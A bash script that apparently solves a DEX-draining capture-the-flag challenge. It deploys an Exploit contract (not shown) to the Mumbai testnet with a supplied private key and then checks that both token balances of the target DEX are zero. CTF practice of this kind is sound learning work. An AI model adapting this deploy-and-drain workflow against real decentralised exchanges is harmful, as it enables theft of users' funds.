#!/bin/bash

PRIVATE_KEY="$1"
if [ -z "$PRIVATE_KEY" ]
then
    echo "PRIVATE_KEY must be passed as the first argument" >&2
    exit 1
fi

CONTRACT_ADDRESS="$2"
if [ -z "$CONTRACT_ADDRESS" ]
then
    echo "CONTRACT_ADDRESS must be passed as the second argument" >&2
    exit 1
fi

echo "[INFO] Deploying exploit & exploiting DEX..." >&2
EXPLOIT_ADDRESS=$(forge create \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    --private-key $PRIVATE_KEY \
    src/Exploit.sol:Exploit\
    --constructor-args $CONTRACT_ADDRESS \
    | grep "Deployed to:" \
    | awk '{print $3}')

if [ $? -ne 0 ] || [ -z "$EXPLOIT_ADDRESS" ]
then
    echo "[ERROR] Exploit contract deployment failed" >&2
    exit 1
fi
echo "[INFO] Contract deployed to $EXPLOIT_ADDRESS" >&2

echo "[INFO] Checking DEX balances..." >&2
TOKEN1_ADDRESS=$(cast call "$CONTRACT_ADDRESS" \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    "token1()(address)")

TOKEN2_ADDRESS=$(cast call "$CONTRACT_ADDRESS" \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    "token2()(address)")

DEX_TOKEN1_BALANCE=$(cast call "$TOKEN1_ADDRESS" \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    "balanceOf(address)(uint256)" \
    "$CONTRACT_ADDRESS")

DEX_TOKEN2_BALANCE=$(cast call "$TOKEN2_ADDRESS" \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    "balanceOf(address)(uint256)" \
    "$CONTRACT_ADDRESS")

if [ $DEX_TOKEN1_BALANCE -eq 0 ] && [ $DEX_TOKEN2_BALANCE -eq 0 ]
then
    echo "solved!"
else
    echo "[ERROR] exploit failed" >&2
fi
